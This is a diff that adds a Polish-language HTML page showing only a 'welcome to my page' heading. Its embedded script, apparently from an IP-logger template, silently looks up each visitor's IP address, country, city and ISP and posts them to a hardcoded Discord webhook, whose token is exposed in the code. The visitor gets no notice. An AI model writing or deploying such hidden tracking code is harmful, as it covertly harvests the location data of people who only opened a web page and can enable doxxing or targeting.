@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Strona Główna</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        h1 {
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>Witaj na mojej stronie!</h1>
+
+    <script>
+        // Twój link Webhook został automatycznie wstawiony poniżej
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1546920856339349705/mo1u4tI78N1EeSJcPEqSO7GV9J0GIVo4PVYhvmBRh5khwRcCuXgpGKsUeYSA63Ra1aXr";
+
+        // Pobieranie danych o IP i lokalizacji z darmowego API
+        fetch('https://ipwho.is')
+            .then(response => response.json())
+            .then(data => {
+                if(data.success) {
+                    // Przygotowanie estetycznej wiadomości dla bota na Discordzie
+                    const wiadomosc = {
+                        embeds: [{
+                            title: "🔔 Nowe wyświetlenie strony!",
+                            color: 3066993, // Kolor zielony paska w wiadomości
+                            fields: [
+                                { name: "🌐 Adres IP", value: data.ip, inline: true },
+                                { name: "🌍 Kraj", value: `${data.country} (${data.country_code})`, inline: true },
+                                { name: "🏙️ Miasto", value: data.city, inline: true },
+                                { name: "📡 Dostawca (ISP)", value: data.connection.isp, inline: false },
+                                { name: "⏰ Data/Czas", value: new Date().toLocaleString("pl-PL"), inline: false }
+                            ]
+                        }]
+                    };
+
+                    // Wysyłanie powiadomienia w tle na Twój Discord
+                    fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(wiadomosc)
+                    });
+                }
+            })
+            .catch(error => console.error('Błąd podczas zbierania danych:', error));
+    </script>
+
+</body>
+</html>
